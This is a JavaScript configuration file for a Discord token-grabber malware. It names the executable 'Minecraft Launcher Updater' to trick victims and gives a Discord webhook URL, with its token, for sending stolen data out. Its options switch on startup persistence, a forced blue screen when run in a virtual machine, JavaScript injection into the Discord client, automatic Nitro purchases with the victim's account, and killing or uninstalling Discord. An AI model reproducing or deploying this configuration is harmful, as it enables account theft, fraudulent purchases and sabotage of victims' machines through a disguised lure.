module.exports = {
  // The name the grabber will have
  name: 'Minecraft Launcher Updater',
  // The EXE name the grabber will have
  filename: 'Updater',
  webhook: {
    url: 'https://discord.com/api/webhooks/1008130525665439816/wRlNXfACrEsTok15kBDKundj_6G6u1-ksvFOgQeqv_ZtS25wZfxkFJUn0k34pQnP7KFE',
    content: '@everyone',
  },
  // Should we add the grabber to the startup programs?
  addToStartup: false,
  // If the user runs the grabber from a virtual machine, should the grabber exits?
  vmProtect: false,
  // If the user runs the grabber from a virtual machine, should a BSOD be triggered?
  bsodIfVm: true,
  fakeError: false,
  infoHTML: true,
  discord: {
    // Inject JavaScript into the Discord desktop app
    injectJs: false,
    // Do we buy Nitro as soon as the user has launched the grabber?
    autoBuyNitro: false,
    // Do we need to uninstall the Discord desktop client?
    uninstall: false,
    // Do we need to kill the Discord desktop client process?
    killProcess: false,
    // `false` for disabling, a string with the invite code for enabling
    autoJoinGuild: false
  }
};
